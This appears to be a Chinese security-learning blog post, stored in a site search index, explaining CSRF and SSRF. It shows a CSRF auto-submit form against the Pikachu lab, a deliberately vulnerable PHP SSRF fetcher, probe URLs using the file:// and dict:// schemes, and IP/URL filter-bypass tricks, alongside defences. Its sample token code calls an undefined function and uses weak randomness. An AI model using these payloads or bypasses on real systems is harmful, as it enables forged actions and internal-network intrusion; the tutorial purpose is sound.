<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSRF与SSRF</title>
    <url>/2023/06/10/CSRF%E4%B8%8ESSRF/</url>
    <content><![CDATA[<h1 id="一、CSRF"><a href="#一、CSRF" class="headerlink" title="一、CSRF:"></a>一、CSRF:</h1><h2 id="漏洞解释与原理"><a href="#漏洞解释与原理" class="headerlink" title="漏洞解释与原理"></a>漏洞解释与原理</h2><h3 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h3><p>跨站请求伪造（Cross-Site Request Forgery，CSRF），完全不同于XSS攻击。</p>
<blockquote>
<p>XSS攻击侧重于获取用户的权限及信息，而CSRF则是攻击者可伪造当前用户的行为，让目标服务器误以为请求由当前用户发起，并利用当前用户权限实现业务请求伪造。</p>
<p>XSS<strong>利用</strong>站点内的信任用户，而CSRF则通过<strong>伪装</strong>成受信任用户请求受信任的网站。</p>
</blockquote>
<p>可见，CSRF侧重于伪造特定用户的请求。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617153429031.png"></p>
<h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><blockquote>
<p>攻击者先伪造一个页面，该页面功能就是为了<strong>伪造</strong>当前用户请求。</p>
<p>当用户点击了恶意页面，会<strong>自动</strong>向当前用户的服务器<strong>提交攻击者伪造</strong>的业务请求，这个恶意请求还是<strong>以当前用户的身份</strong>发起的。</p>
</blockquote>
<p>CSRF攻击的效果是在当前用户不知情的情况下，以当前用户的身份发送业务请求并执行。</p>
<h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h3><p>要攻击形成有效的CSRF攻击必须满足三个条件：</p>
<p>1）用户处于登录状态。</p>
<p>2）伪造的链接与正常应用请求链接一致。</p>
<p>3）后台未对用户业务开展合法性做校验。</p>
<p><img src="/../../../Typora/img111/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6Zu254K55pWy5Luj56CB,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center.jpeg" alt="在这里插入图片描述"></p>
<p>一次csrf攻击的必要步骤：</p>
<p>1.受害人登录受信任站点A，并在本地生成Cookie</p>
<p>2.不登出A的情况下，访问危险站点B</p>
<p>参考：CSDN[零点敲代码]<a href="http://t.csdn.cn/k7lkP">http://t.csdn.cn/k7lkP</a></p>
<h2 id="漏洞检测与案例"><a href="#漏洞检测与案例" class="headerlink" title="漏洞检测与案例"></a>漏洞检测与案例</h2><p>pikachu csrf</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617154921395.png" alt="用户lili信息界面"></p>
<p>我们构造一个代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>图片展示<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:81/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="attr">name</span>=<span class="string">&quot;form&quot;</span> <span class="attr">method</span>=</span></span><br><span class="line"><span class="tag"><span class="string">&quot;post&quot;</span> <span class="attr">role</span>=<span class="string">&quot;form&quot;</span>&gt;</span>  //这个action就是pikachu用户的信息修改界面</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>  <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;CSRF&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>  <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;79&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>  <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;CSRF&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>  <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;CSRF@csrf&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>  <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;View my pictures&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>因为实际情况是让用户点击的。</p>
<p>我们略过诱骗的部分，假设用户已经点击了。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617155415181.png"></p>
<p>点击一下View my pictures.</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617161925480.png"></p>
<p>当然了,get型要容易一些，比如</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost/CSRF%20DEMO/GET/content.php?user=user&amp;title=csrf&amp;text=oday&quot;</span>&gt;</span>View my Pictures!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>

<p>POST请求方式的复杂之处在于需要创建一个隐藏表单，当用户访问时自动提交表单至目标连接，即可实现CSRF攻击</p>
<h2 id="漏洞场景利用"><a href="#漏洞场景利用" class="headerlink" title="漏洞场景利用"></a>漏洞场景利用</h2><p>虽然属于被动引发，但危害还是有滴。比如：</p>
<p>1）当用户是管理员时，如果存在CSRF漏洞，则攻击者可根据业务功能特点构造语句，在管理员不知情的情况下发起某项业务请求（如添加账号、删除某篇文章等），并且攻击者构造的请求会以当前管理员的身份发出并执行。</p>
<p>2）针对个人用户，如果CSRF漏洞配合存储型XSS漏洞，可实现在当前用户页面上嵌入攻击伪造链接，从而大大增加用户点击的可能性，形成触发攻击的隐患。若社交类网站上存在此类问题，则会产生类似蠕虫的攻击效果。</p>
<p>3）在部分管理系统中，考虑到用户使用系统的便利性，可以在后台Web页面上开发特定功能来实现针对管理系统的参数调整。每次在针对管理系统进行参数调整时，都会向服务器发起一次请求。因此，如果CSRF伪造管理员的高危功能管理请求并诱导管理员执行，那么会对当前系统造成非常大的危害。</p>
<h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><p>CSRF一般是由于Web系统对当前用户身份的验证不足而造成的，比如目标站点并未对提交的请求做合法校验，导致任意请求均可执行（在用户合法登录的前提下，业务流程正常的请求）。</p>
<p>常用的防护手段重点在于为关键业务点添加合理的验证方式，以实现对用户合法身份的二次确认。</p>
<h3 id="1-添加中间环节"><a href="#1-添加中间环节" class="headerlink" title="1.添加中间环节"></a>1.添加中间环节</h3><p>由于攻击者只能仿冒用户发起请求，并不能接收服务器的响应内容，因此可在请求被执行前添加防护措施。主要思路为在发起关键业务的请求时，多添加一步验证环节，并且保证验证环节的内容无法被攻击者获取或碰撞，从而有效避免攻击者伪造请求的情况。这个过程中，常用的方式有以下两种。</p>
<p>1.添加验证过程</p>
<blockquote>
<p>CSRF漏洞可成功利用的一个显著特点是攻击者伪造的用户请求会被服务器实际执行。对此，最有效的手段就是在其中添加一个中间过程，如让用户进行确认，从而可以避免这类问题的出现。</p>
</blockquote>
<p>一般效果就是，提交了修改信息，会弹出一个二次确认框，让用户二次确认。攻击者伪造的页面是接收不到这个确认内容的。</p>
<p>注意的是：确认流程应由页面接受后在前台进行显示，不要利用纯前端的技术来实现，如利用JS代码来实现上述确认功能，否则就会失去原有的意义。</p>
<p>2.验证码</p>
<blockquote>
<p>用户在提交内容时需要输入验证码，利用验证码来确认是否为当前用户发起的请求。验证码对于CSRF攻击防护效果良好，但是验证码最好在关键的业务流程点使用。如果在业务流程中过多使用验证码，会导致用户体验严重下降，直接影响到用户的行为。因此不建议过多使用。</p>
</blockquote>
<h3 id="2-验证用户请求合法性"><a href="#2-验证用户请求合法性" class="headerlink" title="2.验证用户请求合法性"></a>2.验证用户请求合法性</h3><p>防护CSRF漏洞的另一个方面是需要对每次请求的合法性进行校验，保证当前由用户发起的请求为用户本人。这是解决CSRF的成因——伪造用户请求的最直接方式。</p>
<p>1.验证referer</p>
<blockquote>
<p>由于CSRF请求发起方为攻击者，因此在referer处，攻击者与当前用户所处的界面完全不同。可通过验证referer值是否合法，即通过验证请求来源的方式确定此次请求是否正常。但是，在某些情况下referer验证存在缺陷，那么可以利用各种伪造的方式实现对referer验证的绕过。推荐利用referer来监控CSRF行为，如果将其用于防御，效果并不一定良好。</p>
</blockquote>
<p>2.token</p>
<blockquote>
<p>针对CSRF漏洞，在建设Web系统时一般会利用token来识别当前用户身份的真实性。token在当前用户第一次访问某项功能页面时生成，且token是一次性的，在生成完毕后由服务器端发送给客户端。用户端接收到token之后，会在进行下一步业务时提交token，并由服务器进行有效性验证。由于攻击者在CSRF利用时无法获得当前用户的token，导致就算链接发送成功，也会由于没有附带token值，导致针对请求的验证发生错误，当前攻击请求也就无法正常执行。</p>
</blockquote>
<p>基础token代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session_start();  </span><br><span class="line">function token_start() &#123;  </span><br><span class="line">    $_SESSION[&#x27;token&#x27;] = md5(rand(1,10000));  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">function token_check () &#123;  </span><br><span class="line">    $return = $_REQUEST[&#x27;token&#x27;] === $_SESSION[&#x27;token&#x27;] ? true : false;  </span><br><span class="line">    token_start ();  </span><br><span class="line">    return $return;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">//如果token为空则生成一个token  </span><br><span class="line">if(!isset($_SESSION[&#x27;token&#x27;]) || $_SESSION[&#x27;token&#x27;]==&#x27;&#x27;) &#123;  </span><br><span class="line">    token_start ();  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">if(isset($_POST[&#x27;test&#x27;]))&#123;  </span><br><span class="line">    if(!valid_token())&#123;  </span><br><span class="line">        echo &quot;token fail&quot;;  </span><br><span class="line">    &#125;else&#123;  </span><br><span class="line">        echo &#x27;success，Value:&#x27;.$_POST[&#x27;test&#x27;];  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">/*这里利用10000以内的随机数的MD5值作为token（仅作示例），或者利用PHP基于当前时间（微秒）生成唯一ID的函数unipid（）。之后，根据当前用户提交的情况进行token验证及更新。这里可以看到，在每次访问之后都会进行token更新（无论提交成功还是失败）。*/</span><br></pre></td></tr></table></figure>

<p><strong>使用token时需遵循以下原则：</strong></p>
<p>1）token必须为<strong>一次性</strong>，无论该业务流程执行成功还是失败，在每次用户请求时均重新生成token并在客户端进行更新。</p>
<p>2）token需有较强的<strong>随机性</strong>，避免采取简单的可预测的方式，使攻击者猜测出token的生成规律，进而导致token失效。</p>
<h2 id="csrf漏洞总结"><a href="#csrf漏洞总结" class="headerlink" title="csrf漏洞总结"></a>csrf漏洞总结</h2><p>对于XSS攻击，CSRF攻击的原理、攻击目标均不相同，使用条件也较为苛刻。</p>
<p>与XSS防护不同的是，CSRF防护不会关注对连接、提交参数的过滤，而是重点对业务开展的合法性进行验证，如验证请求是否来自当前用户、在重点功能处添加验证环节、通过token进行验证等。</p>
<ol>
<li>当用户发送重要请求时，需要再输入密码</li>
<li>设置随机token</li>
<li>检验Referer来源，请求时判断请求链接是否为当前管理员正在使用的页面（比如点击危险的修改密码链接时，管理员需要有修改密码的页面，而不是编辑文章的页面）</li>
<li>验证码</li>
<li>限制为只能post请求</li>
</ol>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF:"></a>SSRF:</h1><p>SSRF<br>    是什么<br>        SSRF(Server-Side Request Forgery 服务器请求伪造)<br>        目标 ：从外网无法访问的内部系统<br>        原因 ：服务器端提供了从其他服务器应用获取数据的功能且没有对目标地址过滤和限制<br>    挖掘<br>        web功能上<br>            分享<br>                URL地址分享网页内容<br>            转码服务<br>                通过url地址把原地址网页内容调优使其适合手机屏幕浏览<br>            在线翻译<br>                通过url地址翻译对应文本内容<br>            图片加载与下载<br>                通过url地址加载或下载图片<br>            图片、文章收藏功能<br>            未公开的api实现以及其他调用url功能<br>        URL关键字中找<br>            share<br>            wap<br>            url<br>            link<br>            src<br>            source<br>            target<br>            u<br>            3g<br>            display<br>            domain<br>            source(image)url<br>    验证<br>        基本判断<br>            burpsuite抓包<br>            右键打开图片<br>    绕过<br>        子主题 1<br>        子主题 2</p>
<h2 id="解释：-1"><a href="#解释：-1" class="headerlink" title="解释："></a>解释：</h2><p>服务器端请求伪造（Server-Side Request Forgery，SSRF）是另一种服务器端请求伪造的形式，<strong>攻击者可构造由服务器端发起请求的安全漏洞</strong>。相对于跨站请求伪造，服务器端请求伪造可让服务器执行一些在用户侧无法实现的效果，如内网探测、加载特定图片和文件等。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617153505685.png"></p>
<p>这种从其他服务器应用获取数据的功能，可以使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据。<br>数据流:攻击者—–&gt;服务器—-&gt;目标地址</p>
<p>SSRF虽然无法直接请求内网的其他主机信息，但是可以借助能访问的服务器，当做跳板，进而进行攻击。（用网站自己打自己内网）</p>
<h2 id="ssrf攻击"><a href="#ssrf攻击" class="headerlink" title="ssrf攻击"></a>ssrf攻击</h2><p>在Web应用中，存在着大量需要<strong>由服务器端向第三方发起请求的业务</strong>。</p>
<p>例如，大多数网站具备的天气显示功能，页面首先会获取当前用户的IP地址，并根据IP地址所在的地理位置信息，向<strong>第三方</strong>天气查询服务器发起请求，最后将结果回显给用户。</p>
<p>这类业务的核心问题在于服务器需根据用户提交的参数进行后续的业务流程，因此如果<strong>用户提交恶意的参数信息，并且服务器未对用户提交的参数进行合法性判断而直接执行后续请求业务，就会导致出现安全隐患，</strong>这也是SSRF漏洞的主要成因。</p>
<p>SSRF攻击相对于CSRF攻击来说，攻击者需伪造的请求为<strong>服务器端发起的内容。</strong></p>
<p><strong>前提：</strong></p>
<blockquote>
<p>Web服务器存在<strong>向其他服务器发起请求并获取数据的功能</strong>，并且获取<strong>过程中并未</strong>对目标地址进行<strong>安全过滤或加以限制</strong>，<strong>导致服务器的请求被伪造</strong>，进而实现后续的攻击。</p>
<p>在某种程度上，可认为SSRF漏洞本质上是利用服务器的高权限实现对当前系统敏感信息的访问。</p>
</blockquote>
<p>由于SSRF漏洞存在的前提是服务器具有主动发起请求的功能，因此如果能控制服务器的漏洞点，那么就可实现大量针对内网及服务器的各类型探测及攻击。</p>
<p>《WEB安全基础》所给的可能存在SSRF漏洞缺陷的目标有以下几种</p>
<blockquote>
<p>·图片加载与下载功能</p>
<p>通过URL地址远程加载或下载图片，常见于很多转载行为或远程加载。由于远程加载图片可有效降低当前服务器的资源消耗，因此得到广泛使用。</p>
<p>·本地处理功能</p>
<p>例如，业务流程中需要对用户输入的参数进行本地处理，如要获取提交的URL中的header信息等，这类业务都会由服务器发起请求。</p>
<p>·各类辅助功能</p>
<p>可针对用户输入的参数添加各类辅助信息，提升参数的可视化效果。</p>
<p>·图片、文章收藏功能</p>
<p>将远程地址进行本地保存，这样可让用户在重新发起请求访问时由服务器重新加载远程地址即可。</p>
<p>以上场景在用户视角理解起来比较抽象。下面通过实际案例讲解SSRF的攻击流程。</p>
</blockquote>
<p>百度给出的ssrf攻击效果为</p>
<blockquote>
<p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
<p>5.利用file协议读取本地文件等。.</p>
<p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p>
<p>http:192.168.64.144&#x2F;phpmyadmin&#x2F;<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;192.168.64.144:3306&#x2F;info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p>
<p>参考：CSDN[零点敲代码]<a href="http://t.csdn.cn/sb9kA">http://t.csdn.cn/sb9kA</a></p>
</blockquote>
<ul>
<li>危害：SSRF攻击的危害主要在于攻击者可以利用受影响的服务器来访问内部网络资源、绕过防火墙访问外部服务、执行远程代码等，导致数据泄露、服务器劫持等问题。</li>
<li>防护措施：SSRF攻击的防护措施包括对用户输入进行严格过滤和验证、限制服务器请求的目标地址、使用白名单控制外部访问、限制服务器访问权限等。</li>
</ul>
<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><h4 id="利用SSRF漏洞寻找本地存在的路径"><a href="#利用SSRF漏洞寻找本地存在的路径" class="headerlink" title="利用SSRF漏洞寻找本地存在的路径"></a>利用SSRF漏洞寻找本地存在的路径</h4><p>先构建一个场景，前端输入目标url，服务器用来获取该url的title信息。</p>
<p>前端代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;lx2.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;提交&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>后端代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="variable">$timeout</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span> (<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span> (<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span> (<span class="variable">$ch</span>, CURLOPT_CONNECTTIMEOUT, <span class="variable">$timeout</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line">    <span class="variable">$file_contents</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&lt;title&gt;(.*)&lt;\/title&gt;/i&quot;</span>,<span class="variable">$file_contents</span>, <span class="variable">$title</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$title</span>[<span class="number">1</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617180525427.png"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617180615139.png" alt="访问url，获取页面title信息"></p>
<p>此功能是对输入的URL首先发起请求，并利用正则表达式提取响应内容中的title信息此功能是对输入的URL首先发起请求，并利用正则表达式提取响应内容中的title信息</p>
<p>如果我访问我本地的路径</p>
<p><code>http://localhost:81/DVWA/login.php</code></p>
<p>结果为</p>
<blockquote>
<p>Login :: Damn Vulnerable Web Application (DVWA) v1.10 <em>Development</em></p>
</blockquote>
<p>在真实的SSRF漏洞利用过程中，攻击者还会逐步修改提交URL的路径内容，以实现对目标服务器本地路径的全面检查。当路径出现title信息时，可判断存在对应内容，并且可通过title内容来判断路径的功能。如果服务页面没有对用户提交的URL进行范围限定，还可尝试对当前内网连接进行请求，并获取内部的信息。</p>
<h4 id="利用SSRF漏洞来发现内网应用"><a href="#利用SSRF漏洞来发现内网应用" class="headerlink" title="利用SSRF漏洞来发现内网应用"></a>利用SSRF漏洞来发现内网应用</h4><p>这个是说：</p>
<p>假设有两个内网网段，其中内网1用于模拟正常用户，内网2用于模拟服务器。内网1与内网2无法直接互通，只能利用特定服务器实现应用的开展。假设SSRF环境为真实系统，并且具有内网的访问权限。这里利用漏洞环境进行测试，输入已知的内网服务器地址<a href="http://172.29.152.197:8000并提交，可获取到该URL的title信息（我没有配置，不太懂）">http://172.29.152.197:8000并提交，可获取到该URL的title信息（我没有配置，不太懂）</a></p>
<p><a href="https://blog.csdn.net/qq_43625917/article/details/104528645?ops_request_misc=&request_id=&biz_id=102&utm_term=SSRF%E6%BC%8F%E6%B4%9E%E6%9D%A5%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-104528645.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">SSRF漏洞的利用与攻击内网应用_Qwzf的博客-CSDN博客</a></p>
<p>利用这种方式，可以发现原本攻击者网络不可达的功能页面。<strong>SSRF的主要作用是尽可能获取目标系统的内部信息</strong>，这些信息会为攻击者后续攻击提供非常大的便利。假设未来利用其他漏洞获得内网的访问权限，那么即可根据之前发现的链接来尝试获得更多的信息。</p>
<p>根据存在SSRF漏洞的不同业务功能环境，SSRF漏洞可实现的攻击效果为：</p>
<blockquote>
<p>1）对内网Web应用特征进行发现。</p>
<p>2）对服务器所在内网进行各类信息探测。</p>
<p>3）利用File协议读取本地文件。</p>
<p>4）针对特定目标进行攻击时隐藏攻击发起地址。</p>
</blockquote>
<p>总体来说，SSRF漏洞的实际利用方式及利用效果完全受制当前的业务环境。在早期的Web系统中，会存在大量这类需要服务器发起请求的业务功能，但随着互联网应用的快速发展，各类类型的功能趋近于整合，这类需要服务器发起请求的业务功能类型也逐渐减少。而且，SSRF漏洞攻击过程不会直接威胁到系统权限，但仍不能忽视漏洞的威胁。</p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求<br>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a><br>2.dnslog等工具进行测试，看是否被访问<br>–可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。<br>3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址<br>–从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址<br>–通过二级域名暴力猜解工具模糊猜测内网地址<br>4.直接返回的Banner、title、content等信息<br>5.留意bool型SSRF<br>————————————————<br>版权声明：本文为CSDN博主「Never say die _」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45612828/article/details/126193765">https://blog.csdn.net/qq_45612828/article/details/126193765</a></p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="1-绕过IP"><a href="#1-绕过IP" class="headerlink" title="1.绕过IP"></a>1.绕过IP</h3><p>1）使用IPV6地址<br>2）对IP转化成十进制，八进制等，如0177.0.0.01（八进制）<br>3）利用特殊域名。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1<br>4）利用句号。如127。0。0。1<br>5）可以[::]。如http:&#x2F;&#x2F;[::]:80&#x2F;<br>6）利用短网址。比如百度短地址<br>————————————————<br>版权声明：本文为CSDN博主「Never say die _」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45612828/article/details/126193765">https://blog.csdn.net/qq_45612828/article/details/126193765</a></p>
<h3 id="2-绕过url解析限制"><a href="#2-绕过url解析限制" class="headerlink" title="2.绕过url解析限制"></a>2.绕过url解析限制</h3><ul>
<li>1）使用@符号绕过：如<a href="mailto:&#x31;&#x32;&#x37;&#46;&#48;&#46;&#48;&#x2e;&#x31;&#x40;&#x65;&#x76;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;">&#x31;&#x32;&#x37;&#46;&#48;&#46;&#48;&#x2e;&#x31;&#x40;&#x65;&#x76;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;</a></li>
<li>2）利用302跳转，需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中</li>
</ul>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="PHP中可能存在ssrf的函数"><a href="#PHP中可能存在ssrf的函数" class="headerlink" title="PHP中可能存在ssrf的函数"></a>PHP中可能存在ssrf的函数</h3><p>1）file_get_contents():把整个文件读入一个字符串中，该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能;支持http(s),file协议，在PHP5.4上测试不支持dict，ghoper协议。<br>2）fsockopen():打开一个网络连接或者一个Unix套接字连接，在PHP5.4上测试只有http协议成功<br>3）curl_exec():用于执行指定的CURL会话，支持的协议比较多，常用于SSRF的协议经过测试都支持，如dict,ghoper,file。有的协议需要一定的条件这点需要注意。<br>————————————————<br>版权声明：本文为CSDN博主「Never say die _」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45612828/article/details/126193765">https://blog.csdn.net/qq_45612828/article/details/126193765</a></p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><blockquote>
<p>CSRF漏洞与SSRF漏洞的主要区别在于伪造目标的不同。其次，两种角色（客户端、服务器端）主要实现的功能也有非常大的区别。但从漏洞防护视角来看，其防护思路及方式非常相似，重点需要针对请求伪造的问题进行处理。即：</p>
<p>·用户请求的合法性。</p>
<p>·服务器行为的合规性。</p>
</blockquote>
<p>有效的手段是在业务开展过程中<strong>针对业务的关键点进行重点内容过滤</strong>。相对CSRF漏洞防护方法来说，更推荐在<strong>SSRF防护</strong>方面优先利用<strong>各类黑白名单手段对用户输入的内容进行合法性识别</strong>，并且严格对用户输入参数进行<strong>格式及长度限制</strong>。</p>
<p>在CSRF漏洞防护中最有效的token防御机制，针对SSRF漏洞则效果较差。</p>
<p>因为ssrf的攻击过程由攻击者自行控制。</p>
<p>百度收集的防御手段：</p>
<blockquote>
<p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
<p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
<p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>
<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</p>
